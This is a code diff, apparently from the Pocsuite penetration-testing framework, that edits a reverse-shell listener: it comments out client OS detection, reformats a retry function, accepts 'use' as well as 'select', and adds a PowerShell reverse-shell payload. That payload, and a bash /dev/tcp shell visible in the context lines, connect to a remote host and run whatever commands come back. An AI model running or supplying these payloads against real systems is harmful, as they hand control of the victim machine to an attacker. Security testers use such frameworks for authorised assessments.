@@ -76,39 +76,39 @@ def listener_worker():
 def list_clients():
     results = ''
     for i, client in enumerate(kb.data.clients):
-        try:
-            client.conn.send(str.encode('uname\n'))
-            time.sleep(0.01)
-            ret = client.conn.recv(2048)
-            if ret:
-                ret = ret.decode('utf-8', errors="ignore")
-                system = "unknown"
-                if "darwin" in ret.lower():
-                    system = "Darwin"
-                elif "linux" in ret.lower():
-                    system = "Linux"
-                elif "uname" in ret.lower():
-                    system = "Windows"
-
-        except Exception as ex:  # If a connection fails, remove it
-            logger.exception(ex)
-            del kb.data.clients[i]
-            continue
+        # try:
+        #     client.conn.send(str.encode('uname\n'))
+        #     time.sleep(0.01)
+        #     ret = client.conn.recv(2048)
+        #     if ret:
+        #         ret = ret.decode('utf-8', errors="ignore")
+        #         system = "unknown"
+        #         if "darwin" in ret.lower():
+        #             system = "Darwin"
+        #         elif "linux" in ret.lower():
+        #             system = "Linux"
+        #         elif "uname" in ret.lower():
+        #             system = "Windows"
+        #
+        # except Exception as ex:  # If a connection fails, remove it
+        #     logger.exception(ex)
+        #     del kb.data.clients[i]
+        #     continue
         results += (
-            str(i) +
-            "   " +
-            (desensitization(client.address[0]) if conf.ppt else str(client.address[0])) +
-            "    " +
-            str(client.address[1]) +
-            " ({0})".format(system) +
-            '\n'
+                str(i) +
+                "   " +
+                (desensitization(client.address[0]) if conf.ppt else str(client.address[0])) +
+                "    " +
+                str(client.address[1]) +
+                # " ({0})".format(system) +
+                '\n'
         )
     data_to_stdout("----- Remote Clients -----" + "\n" + results)
 
 
 def get_client(cmd):
     try:
-        target = cmd.replace("select ", "")
+        target = cmd.split(" ")[1]
         target = int(target)
         client = kb.data.clients[target]  # Connect to the selected clients
         data_to_stdout("Now Connected: {0}\n".format(
@@ -253,19 +253,19 @@ def print_cmd_help():
     data_to_stdout(msg)
 
 
-def handle_listener_connection_for_console(wait_time=3,try_count=3):
-        cmd = "select 0"
-        client = get_client(cmd)
-        if client is not None:
-            f = send_shell_commands_for_console(client)
-            if f:
-                return
+def handle_listener_connection_for_console(wait_time=3, try_count=3):
+    cmd = "select 0"
+    client = get_client(cmd)
+    if client is not None:
+        f = send_shell_commands_for_console(client)
+        if f:
+            return
 
-        if try_count > 0:
-            time.sleep(wait_time)
-            data_to_stdout("connect err remaining number of retries %s times\n"%(try_count))
-            try_count -= 1
-            return handle_listener_connection_for_console(wait_time=wait_time,try_count=try_count)
+    if try_count > 0:
+        time.sleep(wait_time)
+        data_to_stdout("connect err remaining number of retries %s times\n" % (try_count))
+        try_count -= 1
+        return handle_listener_connection_for_console(wait_time=wait_time, try_count=try_count)
 
 
 def handle_listener_connection():
@@ -287,7 +287,7 @@ def handle_listener_connection():
             raise PocsuiteShellQuitException
         elif cmd == "list":
             list_clients()
-        elif "select" in cmd:
+        elif cmd.lower().split(" ")[0] in ('select', 'use'):
             client = get_client(cmd)
             if client is not None:
                 send_shell_commands(client)
@@ -313,6 +313,8 @@ class REVERSE_PAYLOAD:
     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
     p.waitFor()
     """
+    POWERSHELL = """$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
+
 
 
 if __name__ == "__main__":
